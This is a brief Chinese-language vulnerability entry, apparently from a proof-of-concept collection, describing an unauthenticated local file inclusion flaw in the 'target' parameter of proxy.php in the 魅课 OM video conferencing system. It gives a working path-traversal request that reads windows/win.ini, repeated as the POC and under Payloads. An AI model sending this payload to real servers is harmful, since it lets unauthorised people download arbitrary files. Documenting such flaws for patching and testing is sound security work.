# 魅课 OM视频会议系统 proxy.php 文件包含漏洞

## 漏洞描述
魅课OM视频会议系统 proxy.php文件target参数存在本地文件包含漏洞。攻击者可借助该漏洞无需登录便可下载任意文件。

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20220525153028849](images/202205251530024.png)

验证POC

```
/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
```


## Payloads
```
/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
```
